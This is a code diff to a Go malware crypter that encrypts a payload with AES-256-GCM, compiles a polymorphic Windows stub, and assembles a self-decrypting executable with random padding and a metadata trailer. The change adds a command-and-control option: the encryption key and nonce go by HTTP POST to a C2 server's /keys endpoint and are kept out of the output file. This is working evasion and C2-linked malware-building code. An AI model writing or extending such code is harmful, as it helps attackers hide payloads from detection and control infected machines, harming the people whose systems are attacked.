@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bytes"
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/rand"
@@ -10,9 +11,11 @@ import (
 	"encoding/json"
 	"fmt"
 	"math/big"
+	"net/http"
 	"os"
 	"os/exec"
 	"path/filepath"
+	"strings"
 )
 
 //go:embed stub.src
@@ -20,24 +23,18 @@ var stubSource []byte
 
 const magic = "HBX1"
 
-// metadata is the JSON trailer appended after the ciphertext.
 type metadata struct {
-	Key           string `json:"key"`
-	Nonce         string `json:"nonce"`
+	Key           string `json:"key,omitempty"`
+	Nonce         string `json:"nonce,omitempty"`
+	KeyID         string `json:"key_id,omitempty"`
+	C2URL         string `json:"c2_url,omitempty"`
 	OriginalName  string `json:"original_name"`
 	OriginalSize  int    `json:"original_size"`
 	CiphertextLen int    `json:"ciphertext_len"`
 	StubSize      int    `json:"stub_size"`
 }
 
-// generateBinary encrypts the payload, compiles the polymorphic stub,
-// and assembles the self-modifying output binary.
-//
-// Output layout:
-//
-//	[stub.exe] [random padding] [ciphertext] [JSON meta] [metaLen 4B] ["HBX1"]
-func generateBinary(payloadPath, outputPath string) error {
-	// 1. Read the payload.
+func generateBinary(payloadPath, outputPath, c2url string) error {
 	plaintext, err := os.ReadFile(payloadPath)
 	if err != nil {
 		return fmt.Errorf("cannot read %s: %w", payloadPath, err)
@@ -46,7 +43,6 @@ func generateBinary(payloadPath, outputPath string) error {
 		return fmt.Errorf("payload must not be empty")
 	}
 
-	// 2. Encrypt with AES-256-GCM.
 	key := make([]byte, 32)
 	nonce := make([]byte, 12)
 	rand.Read(key)
@@ -62,32 +58,44 @@ func generateBinary(payloadPath, outputPath string) error {
 	}
 	ciphertext := gcm.Seal(nil, nonce, plaintext, []byte(magic))
 
-	// 3. Compile the polymorphic stub for Windows.
 	fmt.Println("[INFO] Compiling polymorphic stub for windows/amd64 ...")
 	stub, err := compileStub()
 	if err != nil {
 		return fmt.Errorf("compile stub: %w", err)
 	}
 
-	// 4. Random initial padding (1–64 KB).
 	padLen, _ := rand.Int(rand.Reader, big.NewInt(63*1024))
 	padding := make([]byte, 1024+int(padLen.Int64()))
 	rand.Read(padding)
 
-	// 5. Build the metadata trailer.
 	meta := metadata{
-		Key:           base64.StdEncoding.EncodeToString(key),
-		Nonce:         base64.StdEncoding.EncodeToString(nonce),
 		OriginalName:  filepath.Base(payloadPath),
 		OriginalSize:  len(plaintext),
 		CiphertextLen: len(ciphertext),
 		StubSize:      len(stub),
 	}
+
+	c2url = strings.TrimRight(c2url, "/")
+
+	if c2url != "" {
+		keyID, err := sendKeyToServer(c2url, key, nonce)
+		if err != nil {
+			return fmt.Errorf("key server: %w", err)
+		}
+		meta.KeyID = keyID
+		meta.C2URL = c2url
+		fmt.Printf("[INFO] Key sent to server: key_id=%s\n", keyID)
+		fmt.Printf("[INFO] Key is NOT stored in the output file.\n")
+	} else {
+		meta.Key = base64.StdEncoding.EncodeToString(key)
+		meta.Nonce = base64.StdEncoding.EncodeToString(nonce)
+		fmt.Println("[INFO] Key stored in file (no --c2-url specified).")
+	}
+
 	metaJSON, _ := json.Marshal(meta)
 	metaLenBuf := make([]byte, 4)
 	binary.BigEndian.PutUint32(metaLenBuf, uint32(len(metaJSON)))
 
-	// 6. Assemble output.
 	out, err := os.OpenFile(outputPath, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0o755)
 	if err != nil {
 		return err
@@ -110,7 +118,38 @@ func generateBinary(payloadPath, outputPath string) error {
 	return nil
 }
 
-// compileStub cross-compiles the embedded stub source into a Windows .exe.
+type storeKeyRequest struct {
+	Key   string `json:"key"`
+	Nonce string `json:"nonce"`
+}
+
+type storeKeyResponse struct {
+	KeyID string `json:"key_id"`
+}
+
+func sendKeyToServer(c2url string, key, nonce []byte) (string, error) {
+	body, _ := json.Marshal(storeKeyRequest{
+		Key:   base64.StdEncoding.EncodeToString(key),
+		Nonce: base64.StdEncoding.EncodeToString(nonce),
+	})
+
+	resp, err := http.Post(c2url+"/keys", "application/json", bytes.NewReader(body))
+	if err != nil {
+		return "", fmt.Errorf("cannot reach key server at %s: %w", c2url, err)
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusOK {
+		return "", fmt.Errorf("key server returned %d", resp.StatusCode)
+	}
+
+	var result storeKeyResponse
+	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
+		return "", fmt.Errorf("bad response from key server: %w", err)
+	}
+	return result.KeyID, nil
+}
+
 func compileStub() ([]byte, error) {
 	tmpDir, err := os.MkdirTemp("", "poly-build-")
 	if err != nil {
